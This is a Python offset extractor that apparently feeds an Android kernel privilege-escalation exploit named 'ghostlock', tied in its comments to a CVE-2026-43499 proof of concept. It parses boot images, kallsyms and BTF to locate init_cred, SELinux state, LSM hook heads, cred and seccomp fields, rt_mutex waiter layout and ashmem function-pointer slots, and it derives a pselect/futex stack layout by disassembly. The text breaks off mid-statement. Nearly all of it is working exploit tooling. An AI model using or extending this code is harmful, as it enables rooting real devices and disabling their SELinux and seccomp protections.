#!/usr/bin/env python3
"""Extract only the symbols and BTF fields consumed by ghostlock."""

from __future__ import annotations

import argparse
import gzip
import json
import os
import re
import shutil
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path


ANDROID_MAGIC = b"ANDROID!"
BTF_MAGIC = 0xEB9F
PAGE_SIZE = 4096
FDT_MAGIC = 0xD00DFEED
FDT_BEGIN_NODE = 1
FDT_END_NODE = 2
FDT_PROP = 3
FDT_NOP = 4
FDT_END = 9
ARM64_MEMSTART_ALIGN = 1 << 30

KIND_INT = 1
KIND_PTR = 2
KIND_ARRAY = 3
KIND_STRUCT = 4
KIND_UNION = 5
KIND_ENUM = 6
KIND_FWD = 7
KIND_TYPEDEF = 8
KIND_VOLATILE = 9
KIND_CONST = 10
KIND_RESTRICT = 11
KIND_FUNC = 12
KIND_FUNC_PROTO = 13
KIND_VAR = 14
KIND_DATASEC = 15
KIND_FLOAT = 16
KIND_DECL_TAG = 17
KIND_TYPE_TAG = 18
KIND_ENUM64 = 19


class ExtractError(RuntimeError):
    pass


class InfeasibleError(ExtractError):
    """The kernel stack layout cannot support the pselect/futex route."""


def align(value: int, size: int) -> int:
    return (value + size - 1) & ~(size - 1)


def recover_kernel_phys_load(path: Path) -> int:
    """Recover the XBL Kernel physical base from embedded FDT memory maps."""
    data = path.read_bytes()
    candidates: set[tuple[int, int, int, int]] = set()
    cursor = 0
    while True:
        pos = data.find(struct.pack(">I", FDT_MAGIC), cursor)
        if pos < 0:
            break
        cursor = pos + 4
        if pos + 40 > len(data):
            continue
        (magic, total, struct_off, strings_off, _rsv, version, last_version,
         _cpu, strings_size, struct_size) = struct.unpack_from(">10I", data, pos)
        if magic != FDT_MAGIC or version < 16 or last_version > 17:
            continue
        if total < 40 or pos + total > len(data):
            continue
        if struct_off > total or struct_size > total - struct_off:
            continue
        if strings_off > total or strings_size > total - strings_off:
            continue
        struct_start, struct_end = pos + struct_off, pos + struct_off + struct_size
        strings_start, strings_end = pos + strings_off, pos + strings_off + strings_size
        stack: list[dict[str, object]] = []
        regions: list[tuple[str, str, int, int]] = []
        p = struct_start
        try:
            while p < struct_end:
                token = struct.unpack_from(">I", data, p)[0]
                if token == FDT_BEGIN_NODE:
                    end = data.index(b"\0", p + 4, struct_end)
                    name = data[p + 4:end].decode("ascii")
                    parent_ac = int(stack[-1]["child_ac"]) if stack else 2
                    parent_sc = int(stack[-1]["child_sc"]) if stack else 1
                    path_name = (str(stack[-1]["path"]).rstrip("/") + "/" + name) if stack else ("/" + name if name else "/")
                    stack.append({
                        "path": path_name,
                        "parent_ac": parent_ac,
                        "parent_sc": parent_sc,
                        "child_ac": 2,
                        "child_sc": 1,
                        "props": {},
                    })
                    p = align(end + 1, 4)
                elif token == FDT_END_NODE:
                    node = stack.pop()
                    props = node["props"]
                    assert isinstance(props, dict)
                    label = props.get("mem-label", b"").split(b"\0", 1)[0].decode("ascii")
                    reg = props.get("reg")
                    if "/memorymap/" in str(node["path"]) and label in {"NOMAP", "Kernel"} and reg is not None:
                        ac, sc = int(node["parent_ac"]), int(node["parent_sc"])
                        if ac not in (1, 2) or sc not in (1, 2) or len(reg) != (ac + sc) * 4:
                            raise ValueError("unsupported memory-map reg")
                        split = ac * 4
                        regions.append((label, str(node["path"]), int.from_bytes(reg[:split], "big"), int.from_bytes(reg[split:], "big")))
                    p += 4
                elif token == FDT_PROP:
                    size, name_off = struct.unpack_from(">II", data, p + 4)
                    if name_off >= strings_size or p + 12 + size > struct_end or not stack:
                        raise ValueError("invalid property")
                    ns = strings_start + name_off
                    ne = data.index(b"\0", ns, strings_end)
                    prop_name = data[ns:ne].decode("ascii")
                    props = stack[-1]["props"]
                    assert isinstance(props, dict)
                    props[prop_name] = data[p + 12:p + 12 + size]
                    if prop_name == "#address-cells" and size == 4:
                        stack[-1]["child_ac"] = int.from_bytes(props[prop_name], "big")
                    elif prop_name == "#size-cells" and size == 4:
                        stack[-1]["child_sc"] = int.from_bytes(props[prop_name], "big")
                    p = align(p + 12 + size, 4)
                elif token == FDT_NOP:
                    p += 4
                elif token == FDT_END:
                    break
                else:
                    raise ValueError("unknown FDT token")
            nomap = {(base, size) for label, _, base, size in regions if label == "NOMAP"}
            kernel = {(base, size) for label, _, base, size in regions if label == "Kernel"}
            if len(nomap) == 1 and len(kernel) == 1:
                nb, ns = next(iter(nomap)); kb, ks = next(iter(kernel))
                if nb & (PAGE_SIZE - 1) or kb & (PAGE_SIZE - 1) or not ns or not ks:
                    raise ValueError("unaligned or empty memory map")
                if not (nb & -ARM64_MEMSTART_ALIGN) <= nb < (nb & -ARM64_MEMSTART_ALIGN) + ARM64_MEMSTART_ALIGN:
                    raise ValueError("invalid NOMAP phys offset")
                candidates.add((nb, ns, kb, ks))
        except (IndexError, UnicodeError, ValueError, struct.error):
            continue
    if not candidates:
        return recover_kernel_phys_load_text(path)
    if len(candidates) != 1:
        raise ExtractError(f"xbl_config contains conflicting memory maps: {sorted(candidates)}")
    return next(iter(candidates))[2]


def recover_kernel_phys_load_text(path: Path) -> int:
    """Some vendors (e.g. Xiaomi) carry the XBL memory map as a UEFI-style
    text table instead of /memorymap/ FDT nodes, e.g.
    '0xA8000000, 0x10000000, "Kernel", AddMem, SYS_MEM, SYS_MEM_CAP, ...'."""
    text = path.read_bytes().decode("ascii", "replace")
    candidates: set[tuple[int, int]] = set()
    for match in re.finditer(
        r'0x([0-9A-Fa-f]+)\s*,\s*0x([0-9A-Fa-f]+)\s*,\s*"Kernel"\s*,\s*AddMem',
        text,
    ):
        base, size = int(match.group(1), 16), int(match.group(2), 16)
        if base & (PAGE_SIZE - 1) or not size:
            raise ValueError("unaligned or empty text memory map")
        candidates.add((base, size))
    if not candidates:
        raise ExtractError(
            "xbl_config contains no Kernel memory map (FDT or text)"
        )
    if len(candidates) != 1:
        raise ExtractError(
            f"xbl_config contains conflicting Kernel maps: {sorted(candidates)}"
        )
    return next(iter(candidates))[0]


LZ4_LEGACY_MAGIC = b"\x02\x21\x4c\x18"
LZ4_MAX_IMAGE = 0x10000000  # 256 MiB upper bound for a decompressed arm64 Image

# MediaTek loads the kernel at the DRAM base (arm64 text_offset=0); DRAM
# starts at 0x80000000 on its current flagship platforms, so this is the
# assumed load address when neither xbl_config nor --phys is available.
MTK_DEFAULT_PHYS_LOAD = 0x80000000


def decompress_lz4_legacy(payload: bytes) -> bytes:
    """MediaTek boot images store the kernel as an LZ4 legacy frame."""
    try:
        import lz4.block
    except ImportError as exc:
        raise ExtractError(
            "MediaTek kernels are LZ4-compressed; install the lz4 module "
            "(pip install lz4)"
        ) from exc
    try:
        out = lz4.block.decompress(payload[8:], uncompressed_size=LZ4_MAX_IMAGE)
    except Exception as exc:
        raise ExtractError(f"invalid LZ4-compressed kernel payload: {exc}") from exc
    if out[:2] != b"MZ" or out[0x38:0x3C] != b"ARM\x64":
        raise ExtractError("LZ4 decompression did not yield an arm64 Image")
    return out


@dataclass
class BootImage:
    path: Path
    kernel: bytes
    mtk_lz4: bool = False

    @classmethod
    def load(cls, path: Path) -> "BootImage":
        raw = path.read_bytes()
        if raw[:8] == ANDROID_MAGIC:
            if len(raw) < 44:
                raise ExtractError("truncated Android boot header")
            kernel_size, header_size, version = (
                struct.unpack_from("<I", raw, 8)[0],
                struct.unpack_from("<I", raw, 20)[0],
                struct.unpack_from("<I", raw, 40)[0],
            )
            if version not in (3, 4):
                raise ExtractError(f"unsupported boot header version {version}")
            start = align(header_size, PAGE_SIZE)
            end = start + kernel_size
            if end > len(raw):
                raise ExtractError("kernel payload exceeds boot image")
            kernel = raw[start:end]
            if kernel[:4] == LZ4_LEGACY_MAGIC:
                kernel = decompress_lz4_legacy(kernel)
                return cls(path, kernel, True)
            return cls(path, kernel)
        if raw[:3] == b"\x1f\x8b\x08":
            try:
                raw = gzip.decompress(raw)
            except OSError as exc:
                raise ExtractError(f"invalid gzip image: {exc}") from exc
        if len(raw) < 64 or raw[56:60] != b"ARM\x64":
            raise ExtractError("input is not an Android boot image or arm64 Image")
        return cls(path, raw)

    def release(self) -> str | None:
        # Skip the printk format string "Linux version %s" and return the
        # real banner version (starts with a kernel version number).
        for match in re.finditer(rb"Linux version ([^\x00\r\n ]+)", self.kernel):
            value = match.group(1).decode("ascii", "replace")
            if re.match(r"^\d+\.\d+", value):
                return value
        return None

    def embedded_btf(self) -> bytes | None:
        signature = struct.pack("<HBBI", BTF_MAGIC, 1, 0, 24)
        cursor = 0
        candidates: list[bytes] = []
        while True:
            pos = self.kernel.find(signature, cursor)
            if pos < 0:
                break
            cursor = pos + 1
            if pos + 24 > len(self.kernel):
                continue
            magic, version, _flags, hdr_len, type_off, type_len, str_off, str_len = (
                struct.unpack_from("<HBBIIIII", self.kernel, pos)
            )
            if magic != BTF_MAGIC or version != 1 or hdr_len < 24:
                continue
            total = hdr_len + max(type_off + type_len, str_off + str_len)
            if total <= hdr_len or pos + total > len(self.kernel):
                continue
            strings = pos + hdr_len + str_off
            if str_len and self.kernel[strings] == 0:
                candidates.append(self.kernel[pos : pos + total])
        return max(candidates, key=len) if candidates else None


@dataclass
class BtfMember:
    name: str
    type_id: int
    bit_offset: int


@dataclass
class BtfType:
    type_id: int
    name: str
    kind: int
    size: int
    members: list[BtfMember] = field(default_factory=list)
    enum_values: list[tuple[str, int]] = field(default_factory=list)


class Btf:
    def __init__(self, raw: bytes):
        if len(raw) < 24:
            raise ExtractError("truncated BTF header")
        magic, version, _flags, hdr_len, type_off, type_len, str_off, str_len = (
            struct.unpack_from("<HBBIIIII", raw, 0)
        )
        if magic != BTF_MAGIC or version != 1 or hdr_len < 24:
            raise ExtractError("invalid BTF header")
        self.types_raw = raw[hdr_len + type_off : hdr_len + type_off + type_len]
        self.strings = raw[hdr_len + str_off : hdr_len + str_off + str_len]
        self.types: dict[int, BtfType] = {}
        self.by_name: dict[str, list[BtfType]] = {}
        self._parse()

    def string(self, offset: int) -> str:
        if offset == 0:
            return ""
        if offset < 0 or offset >= len(self.strings):
            raise ExtractError(f"invalid BTF string offset {offset}")
        end = self.strings.find(b"\x00", offset)
        if end < 0:
            raise ExtractError("unterminated BTF string")
        return self.strings[offset:end].decode("utf-8", "replace")

    def _parse(self) -> None:
        fixed = {
            KIND_INT: 4, KIND_PTR: 0, KIND_ARRAY: 12, KIND_ENUM: 8,
            KIND_FWD: 0, KIND_TYPEDEF: 0, KIND_VOLATILE: 0, KIND_CONST: 0,
            KIND_RESTRICT: 0, KIND_FUNC: 0, KIND_FUNC_PROTO: 8,
            KIND_VAR: 4, KIND_DATASEC: 12, KIND_FLOAT: 0,
            KIND_DECL_TAG: 8, KIND_TYPE_TAG: 0, KIND_ENUM64: 12,
        }
        cursor = 0
        type_id = 1
        while cursor < len(self.types_raw):
            if cursor + 12 > len(self.types_raw):
                raise ExtractError("truncated BTF type record")
            name_off, info, size_or_type = struct.unpack_from(
                "<III", self.types_raw, cursor
            )
            cursor += 12
            kind = (info >> 24) & 0x1F
            vlen = info & 0xFFFF
            item = BtfType(type_id, self.string(name_off), kind, size_or_type)
            if kind in (KIND_STRUCT, KIND_UNION):
                extra = vlen * 12
                if cursor + extra > len(self.types_raw):
                    raise ExtractError("truncated BTF members")
                for index in range(vlen):
                    name, member_type, bit_offset = struct.unpack_from(
                        "<III", self.types_raw, cursor + index * 12
                    )
                    item.members.append(
                        BtfMember(self.string(name), member_type, bit_offset & 0xFFFFFF)
                    )
                cursor += extra
            elif kind == KIND_ENUM:
                extra = vlen * 8
                if cursor + extra > len(self.types_raw):
                    raise ExtractError("truncated BTF enum members")
                kflag = bool(info & (1 << 31))
                for index in range(vlen):
                    ename, raw_value = struct.unpack_from(
                        "<II", self.types_raw, cursor + index * 8
                    )
                    if kflag:
                        raw_value = struct.unpack(
                            "<i", struct.pack("<I", raw_value)
                        )[0]
                    item.enum_values.append((self.string(ename), raw_value))
                cursor += extra
            elif kind == KIND_ENUM64:
                extra = vlen * 12
                if cursor + extra > len(self.types_raw):
                    raise ExtractError("truncated BTF enum64 members")
                kflag = bool(info & (1 << 31))
                for index in range(vlen):
                    ename, low, high = struct.unpack_from(
                        "<III", self.types_raw, cursor + index * 12
                    )
                    value = low | (high << 32)
                    if kflag and high & 0x80000000:
                        value -= 1 << 64
                    item.enum_values.append((self.string(ename), value))
                cursor += extra
            else:
                unit = fixed.get(kind)
                if unit is None:
                    raise ExtractError(f"unsupported BTF kind {kind}")
                cursor += unit * vlen if kind in (
                    KIND_FUNC_PROTO, KIND_DATASEC
                ) else unit
            self.types[type_id] = item
            if item.name:
                self.by_name.setdefault(item.name, []).append(item)
            type_id += 1

    def struct(self, name: str) -> BtfType | None:
        candidates = [
            item for item in self.by_name.get(name, [])
            if item.kind in (KIND_STRUCT, KIND_UNION)
        ]
        return max(candidates, key=lambda item: len(item.members)) if candidates else None

    def resolve(self, type_id: int) -> BtfType | None:
        seen: set[int] = set()
        while type_id and type_id not in seen:
            seen.add(type_id)
            item = self.types.get(type_id)
            if item is None:
                return None
            if item.kind not in (KIND_TYPEDEF, KIND_VOLATILE, KIND_CONST, KIND_RESTRICT, KIND_TYPE_TAG):
                return item
            type_id = item.size
        return None

    def _find_member(self, item: BtfType, name: str, base: int, seen: set[int]) -> int | None:
        if item.type_id in seen:
            return None
        seen.add(item.type_id)
        for member in item.members:
            offset = base + member.bit_offset
            if member.name == name:
                return offset // 8
            if member.name == "":
                child = self.resolve(member.type_id)
                if child is not None and child.kind in (KIND_STRUCT, KIND_UNION):
                    found = self._find_member(child, name, offset, seen.copy())
                    if found is not None:
                        return found
        return None

    def _find_path(
        self, item: BtfType, segments: list[str], base: int,
        seen: set[int],
    ) -> int | None:
        """Resolve a dotted member path (e.g. `pi_tree.prio`) through named
        and anonymous struct/union members, returning the byte offset."""
        if not segments:
            return base // 8
        if item.type_id in seen:
            return None
        seen = seen | {item.type_id}
        name = segments[0]
        for member in item.members:
            offset = base + member.bit_offset
            if member.name == name:
                if len(segments) == 1:
                    return offset // 8
                child = self.resolve(member.type_id)
                if child is not None and child.kind in (KIND_STRUCT, KIND_UNION):
                    return self._find_path(child, segments[1:], offset, seen)
                return None
            if member.name == "":
                child = self.resolve(member.type_id)
                if child is not None and child.kind in (KIND_STRUCT, KIND_UNION):
                    found = self._find_path(child, segments, offset, seen)
                    if found is not None:
                        return found
        return None

    def field(self, struct_name: str, field_name: str) -> int | None:
        item = self.struct(struct_name)
        if item is None:
            return None
        return self._find_path(item, field_name.split("."), 0, set())

    def size(self, struct_name: str) -> int | None:
        item = self.struct(struct_name)
        return item.size if item else None

    def enum_value(self, enum_name: str, member_name: str) -> int | None:
        """Value of one member of a named enum/enum64; None when ambiguous."""
        items = [
            item for item in self.by_name.get(enum_name, [])
            if item.kind in (KIND_ENUM, KIND_ENUM64)
        ]
        if not items:
            return None
        item = max(items, key=lambda item: len(item.enum_values))
        values = [value for name, value in item.enum_values if name == member_name]
        return values[0] if len(values) == 1 else None

    def unique_enum_member_value(self, member_name: str) -> int | None:
        """Value of an enum member that appears exactly once in the whole BTF."""
        matches = [
            (item.type_id, value)
            for item in self.types.values()
            if item.kind in (KIND_ENUM, KIND_ENUM64)
            for name, value in item.enum_values
            if name == member_name
        ]
        if len(matches) != 1:
            return None
        return matches[0][1]

    def type_size(self, type_id: int, seen: frozenset[int] = frozenset()) -> int | None:
        """Byte size of a BTF type id, resolving qualifiers and arrays."""
        resolved = self.resolve(type_id)
        if resolved is None:
            return None
        if resolved.kind == KIND_PTR:
            return 8
        if resolved.kind == KIND_ARRAY:
            return None
        if resolved.type_id in seen:
            return None
        if resolved.kind in (KIND_INT, KIND_STRUCT, KIND_UNION, KIND_ENUM,
                             KIND_ENUM64, KIND_FLOAT):
            return resolved.size
        return None

    def direct_field_size(self, struct_name: str, field_name: str) -> int | None:
        """Byte size of a direct (non-anonymous) struct member's type."""
        item = self.struct(struct_name)
        if item is None:
            return None
        matches = [member for member in item.members if member.name == field_name]
        if len(matches) != 1:
            return None
        return self.type_size(matches[0].type_id)


def parse_kallsyms(path: Path) -> tuple[dict[str, set[int]], dict[str, set[str]]]:
    symbols: dict[str, set[int]] = {}
    types: dict[str, set[str]] = {}
    pattern = re.compile(r"^([0-9a-fA-F]{8,16})\s+(\S)\s+(.+?)\s*$")
    for line in path.read_text("utf-8", "replace").splitlines():
        match = pattern.match(line)
        if not match:
            continue
        address, symbol_type, name = match.groups()
        value = int(address, 16)
        if value == 0:
            continue
        symbols.setdefault(name, set()).add(value)
        types.setdefault(name, set()).add(symbol_type)
    if "_text" not in symbols and "_head" not in symbols:
        raise ExtractError("kallsyms has no _text or _head symbol")
    return symbols, types


def unique(symbols: dict[str, set[int]], name: str) -> int | None:
    values = symbols.get(name, set())
    return next(iter(values)) if len(values) == 1 else None


def find_data_symbol(
    symbols: dict[str, set[int]], types: dict[str, set[str]], exact: str,
    fragments: tuple[str, ...] = (),
) -> int | None:
    address = unique(symbols, exact)
    if address is not None:
        return address
    matches: set[int] = set()
    for name, values in symbols.items():
        if not fragments or not all(fragment.lower() in name.lower() for fragment in fragments):
            continue
        if not (types.get(name, set()) & set("dDbB")):
            continue
        matches.update(values)
    return next(iter(matches)) if len(matches) == 1 else None


def find_function(symbols: dict[str, set[int]], exact: str, fragments: tuple[str, ...] = ()) -> int | None:
    address = unique(symbols, exact)
    if address is not None:
        return address
    matches: set[int] = set()
    for name, values in symbols.items():
        if all(fragment.lower() in name.lower() for fragment in fragments):
            matches.update(values)
    return next(iter(matches)) if len(matches) == 1 else None


SYMBOLS = {
    "off_init_task": ("init_task",),
    "off_init_cred": ("init_cred",),
    "off_root_task_group": ("root_task_group",),
    "off_selinux_enforcing": ("selinux_state",),
    "off_selinux_blob_sizes": ("selinux_blob_sizes",),
    "off_security_hook_heads": ("security_hook_heads",),
    "off_kmalloc_caches": ("kmalloc_caches",),
    "off_anon_pipe_buf_ops": ("anon_pipe_buf_ops",),
    "off_slide_nfulnl_logger": ("nfulnl_logger",),
    "off_slide_boot_id": ("sysctl_bootid",),
}

FUNCTIONS = {
    "off_configfs_read_iter": ("configfs_read_iter",),
    "off_configfs_bin_write_iter": ("configfs_bin_write_iter",),
    # 5.15 kernels predate copy_splice_read (6.1+); the same splice-read
    # slot role is served by generic_file_splice_read.
    "off_copy_splice_read": ("copy_splice_read", "generic_file_splice_read"),
    "off_noop_llseek": ("noop_llseek",),
}

ASHMEM_FUNCTIONS = {
    "off_ashmem_ioctl": ("ashmem_ioctl", "fops_ioctl"),
    "off_ashmem_compat_ioctl": ("compat_ashmem_ioctl", "fops_compat_ioctl"),
    "off_ashmem_mmap": ("ashmem_mmap", "fops_mmap"),
    "off_ashmem_open": ("ashmem_open", "fops_open"),
    "off_ashmem_release": ("ashmem_release", "fops_release"),
    "off_ashmem_show_fdinfo": ("ashmem_show_fdinfo", "fops_show_fdinfo"),
}

# file_operations slot offsets: classic C layout (OPPO 6.6) vs 6.12+ Rust
# vtable, which differ by one 8-byte field before unlocked_ioctl.
ASHMEM_FOPS_LAYOUTS = (
    {
        "off_ashmem_ioctl": 0x50,
        "off_ashmem_compat_ioctl": 0x58,
        "off_ashmem_mmap": 0x60,
        "off_ashmem_open": 0x68,
        "off_ashmem_release": 0x78,
        "off_ashmem_show_fdinfo": 0xd8,
    },
    {
        "off_ashmem_ioctl": 0x48,
        "off_ashmem_compat_ioctl": 0x50,
        "off_ashmem_mmap": 0x58,
        "off_ashmem_open": 0x68,
        "off_ashmem_release": 0x78,
        "off_ashmem_show_fdinfo": 0xd8,
    },
)


# GKI kernels drop some data symbols; unresolved optionals emit 0 and the
# runtime falls back to target.h defaults.
OPTIONAL_SYMBOLS = {
    "off_security_hook_heads",
    "off_ashmem_fops",
    "off_ashmem_misc_fops",
}

STRUCT_FIELDS = {
    "task_struct": {
        "task_prio": "prio", "task_normal_prio": "normal_prio",
        "task_sched_task_group": "sched_task_group", "task_pi_lock": "pi_lock",
        "task_pi_waiters": "pi_waiters", "task_pi_top_task": "pi_top_task",
        "task_pi_blocked_on": "pi_blocked_on", "task_pid": "pid", "task_tgid": "tgid",
        "task_atomic_flags": "atomic_flags",
        "task_real_cred": "real_cred", "task_cred": "cred", "task_comm": "comm",
        "task_tasks": "tasks", "task_seccomp": "seccomp",
    },
    "rt_mutex_waiter": {
        # 5.15 kernels name the rb-tree entries tree_entry/pi_tree_entry.
        "waiter_tree": ("tree", "tree_entry"), "waiter_pi_tree": ("pi_tree", "pi_tree_entry"),
        # 6.x splits tree/pi priorities and deadlines; this Android 5.15
        # backport keeps a single shared prio/deadline pair.
        # Some vendor 6.6 kernels wrap rb_node + prio/deadline in a named
        # rt_waiter_node, so the prio/deadline fields are nested
        # (tree.prio / pi_tree.prio) instead of flat tree_prio/pi_tree_prio.
        "waiter_tree_prio": ("tree_prio", "tree.prio", "prio"),
        "waiter_tree_deadline": ("tree_deadline", "tree.deadline", "deadline"),
        "waiter_pi_tree_prio": ("pi_tree_prio", "pi_tree.prio", "prio"),
        "waiter_pi_tree_deadline": (
            "pi_tree_deadline", "pi_tree.deadline", "deadline",
        ),
        "waiter_task": "task", "waiter_lock": "lock",
        "waiter_wake_state": "wake_state", "waiter_ww_ctx": "ww_ctx",
    },
    "cred": {
        "cred_uid": "uid", "cred_securebits": "securebits",
        "cred_caps": "cap_inheritable", "cred_security": "security",
    },
    "seccomp": {
        "seccomp_mode": "mode", "seccomp_filter_count": "filter_count", "seccomp_filter": "filter",
    },
    "file_operations": {
        "fops_owner": "owner", "fops_llseek": "llseek", "fops_read": "read",
        "fops_write": "write", "fops_read_iter": "read_iter", "fops_write_iter": "write_iter",
        "fops_ioctl": "unlocked_ioctl", "fops_compat_ioctl": "compat_ioctl", "fops_mmap": "mmap",
        "fops_open": "open", "fops_release": "release", "fops_splice_read": "splice_read",
        "fops_show_fdinfo": "show_fdinfo",
    },
    "configfs_buffer": {
        "cfg_page": "page", "cfg_needs_read_fill": "needs_read_fill",
        "cfg_bin_buffer": "bin_buffer", "cfg_bin_buffer_size": "bin_buffer_size",
        "cfg_cb_max_size": "cb_max_size",
    },
}


def resolve_symbols(
    symbols: dict[str, set[int]], types: dict[str, set[str]],
    btf: Btf | None, base: int, release: str | None,
) -> dict[str, int | None]:
    result: dict[str, int | None] = {}
    for name, (symbol,) in SYMBOLS.items():
        result[name] = unique(symbols, symbol)
    for name, candidates in FUNCTIONS.items():
        value = None
        for symbol in candidates:
            value = unique(symbols, symbol)
            if value is not None:
                break
        result[name] = value
    result["off_slide_loggers_0_1"] = (
        unique(symbols, "loggers") + 0x10 if unique(symbols, "loggers") is not None else None
    )
    misc = find_data_symbol(symbols, types, "ashmem_misc", ("ashmem", "misc"))
    misc_fops = btf.field("miscdevice", "fops") if btf else None
    if misc_fops is None and btf is None and kernel_struct_macro(release) == "STRUCT_OFFSETS_6_6":
        # No BTF: miscdevice.fops is at 0x10 on 6.6 (after minor/name).
        misc_fops = 0x10
    result["off_ashmem_misc_fops"] = (
        misc + misc_fops if misc is not None and misc_fops is not None else None
    )
    result["off_ashmem_fops"] = find_data_symbol(
        symbols, types, "ashmem_fops", ("ashmem", "fops")
    )
    for field_name, fragments in ASHMEM_FUNCTIONS.items():
        exact, rust_fragment = fragments
        value = unique(symbols, exact)
        if value is None:
            value = find_function(symbols, exact, (rust_fragment, "ashmem_rust6Ashmem"))
        result[field_name] = value
    return {
        name: None if value is None else value - base
        for name, value in result.items()
    }


def scan_ashmem_fops(
    kernel: bytes, base: int, resolved: dict[str, int | None]
) -> int | None:
    """Scan for a file_operations whose slots point at the resolved ashmem
    functions; 6.12+ Rust ashmem exposes no kallsyms data symbol, so this is
    the only reliable way to resolve off_ashmem_fops there.
    Returns the _text-relative offset, or None when not unique."""
    candidates: set[int] = set()
    for layout in ASHMEM_FOPS_LAYOUTS:
        slots = [
            (key, off) for key, off in layout.items() if resolved.get(key) is not None
        ]
        if len(slots) < 4:
            continue
        anchor_key, anchor_off = slots[0]
        anchor = struct.pack("<Q", base + resolved[anchor_key])
        max_slot = max(off for _, off in slots)
        pos = 0
        while True:
            pos = kernel.find(anchor, pos)
            if pos < 0:
                break
            start = pos - anchor_off
            if start >= 0 and start % 8 == 0 and start + max_slot + 8 <= len(kernel):
                if all(
                    struct.unpack_from("<Q", kernel, start + off)[0]
                    == base + resolved[key]
                    for key, off in slots[1:]
                ):
                    candidates.add(start)
            pos += 1
    return next(iter(candidates)) if len(candidates) == 1 else None



# llvm-objdump auto-derives pselect_waiter_shift and the nf_logger slide slot
# (ported from Linuxoid-cn/CVE-2026-43499-Poc-Analysis generate_target.py).
# arm64 Image is PE/COFF, so objdump addresses equal base-relative kallsyms
# offsets (raw == vaddr == RVA).

PSELECT_ROUTE_NFDS = 320
OBJDUMP_CAP = 0x2000


def find_llvm_objdump(explicit: str | None) -> str | None:
    """Locate llvm-objdump: --llvm-objdump, PATH, then common NDK installs."""
    if explicit:
        tool = Path(explicit)
        if not tool.is_file():
            raise ExtractError(f"llvm-objdump not found: {tool}")
        return str(tool)
    tool = shutil.which("llvm-objdump")
    if tool:
        return tool
    roots = [
        Path(os.environ.get("ANDROID_NDK_HOME", "")),
        Path(os.environ.get("ANDROID_NDK_ROOT", "")),
        Path(os.environ.get("LOCALAPPDATA", "")) / "Android" / "Sdk" / "ndk",
        Path("D:/AndroidSDK/ndk"),
    ]
    for root in roots:
        if not root.is_dir():
            continue
        prebuilts = sorted(
            root.glob("*/toolchains/llvm/prebuilt/*/bin/llvm-objdump.exe")
        )
        if prebuilts:
            return str(prebuilts[-1])
        direct = root / "toolchains/llvm/prebuilt/windows-x86_64/bin/llvm-objdump.exe"
        if direct.is_file():
            return str(direct)
    return None


def run_objdump(tool: str, kernel_path: Path, start: int, stop: int) -> str:
    if stop <= start or stop - start > 0x20000:
        raise ExtractError(f"disassembly range invalid: 0x{start:x}..0x{stop:x}")
    proc = subprocess.run(
        [
            tool, "-d", "--triple=aarch64",
            f"--start-address=0x{start:x}", f"--stop-address=0x{stop:x}",
            str(kernel_path),
        ],
        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    if proc.returncode != 0:
        raise ExtractError(f"llvm-objdump failed: {proc.stderr.strip()}")
    if "Disassembly of section" not in proc.stdout:
        raise ExtractError(
            f"llvm-objdump produced no disassembly for 0x{start:x}..0x{stop:x}"
        )
    return proc.stdout


def relative_symbols(
    symbols: dict[str, set[int]], base: int
) -> tuple[dict[str, set[int]], list[int]]:
    """Rebase kallsyms onto _text and return a sorted list of all offsets."""
    relative: dict[str, set[int]] = {}
    all_offsets: set[int] = set()
    for name, values in symbols.items():
        offsets = {value - base for value in values if value >= base}
        if offsets:
            relative[name] = offsets
            all_offsets.update(offsets)
    return relative, sorted(all_offsets)


def unique_offset(symbols: dict[str, set[int]], name: str) -> int:
    values = symbols.get(name)
    if not values or len(values) != 1:
        raise ExtractError(
            f"kallsyms symbol {name!r} not unique: "
            + repr(sorted(hex(v) for v in values or set()))
        )
    return next(iter(values))


def disassemble_symbol(
    tool: str,
    kernel_path: Path,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    name: str,
    cap: int = OBJDUMP_CAP,
) -> str:
    start = unique_offset(symbols, name)
    higher = [off for off in sorted_offsets if off > start]
    stop = min(start + cap, higher[0] if higher else start + cap)
    return run_objdump(tool, kernel_path, start, stop)


def first_sp_frame(text: str, name: str) -> int:
    matches = re.findall(r"\bsub\s+sp,\s*sp,\s*#0x([0-9a-f]+)", text, re.I)
    if not matches:
        raise ExtractError(f"{name} has no explicit `sub sp,sp,#imm` frame")
    return int(matches[0], 16)


def has_direct_call(text: str, target: int) -> bool:
    return bool(re.search(rf"\bbl\s+0x{target:x}\b", text, re.I))


def validate_frame_live_at(text: str, anchor: str, name: str) -> None:
    """Prove the first explicit frame allocation is still live at one anchor."""
    lines = text.splitlines()
    anchors = [
        index for index, line in enumerate(lines)
        if re.search(anchor, line, re.I)
    ]
    if len(anchors) != 1:
        raise ExtractError(f"{name} frame anchor not unique: {len(anchors)}")
    anchor_index = anchors[0]
    subs = [
        index for index, line in enumerate(lines[:anchor_index])
        if re.search(r"\bsub\s+sp,\s*sp,\s*#0x[0-9a-f]+", line, re.I)
    ]
    if len(subs) != 1:
        raise ExtractError(f"{name} has {len(subs)} SP frames before anchor")
    for index in range(subs[0] + 1, anchor_index):
        line = lines[index]
        if re.search(r"\[\s*sp\],\s*#0x[0-9a-f]+", line, re.I):
            raise ExtractError(f"{name} restores SP post-index before anchor")
        if re.search(r"\b(?:add|sub)\s+sp,\s*sp,", line, re.I):
            rest = lines[index + 1:anchor_index]
            if not any(
                re.search(r"\bd65f03c0\b|\bret\b", tail, re.I)
                for tail in rest
            ):
                raise ExtractError(f"{name} adjusts SP again before anchor")


def derive_pselect_layout(
    tool: str,
    kernel_path: Path,
    symbols: dict[str, set[int]],
    sorted_offsets: list[int],
    btf: Btf,
    route_nfds: int,
) -> dict[str, int]:
    """Derive the pselect/futex waiter word shift from disassembly, handling
    both pselect chains (inlined or via do_pselect) and both futex dispatch
    styles (via do_futex or direct)."""
    names = {
        "pselect_wrapper": "__arm64_sys_pselect6",
        "pselect_core": "core_sys_select",
        "futex_wrapper": "__arm64_sys_futex",
        "futex_dispatch": "do_futex",
        "futex_wait": "futex_wait_requeue_pi",
    }
    if unique_offset_optional(symbols, "do_pselect") is not None:
        names["pselect_dispatch"] = "do_pselect"

    dis = {
        key: disassemble_symbol(tool, kernel_path, symbols, sorted_offsets, name)
        for key, name in names.items()
    }

    pselect_chain = ["pselect_wrapper"]
    pselect_core_addr = unique_offset(symbols, names["pselect_core"])
    if has_direct_call(dis["pselect_wrapper"], pselect_core_addr):
        pass
    elif "pselect_dispatch" in names and has_direct_call(
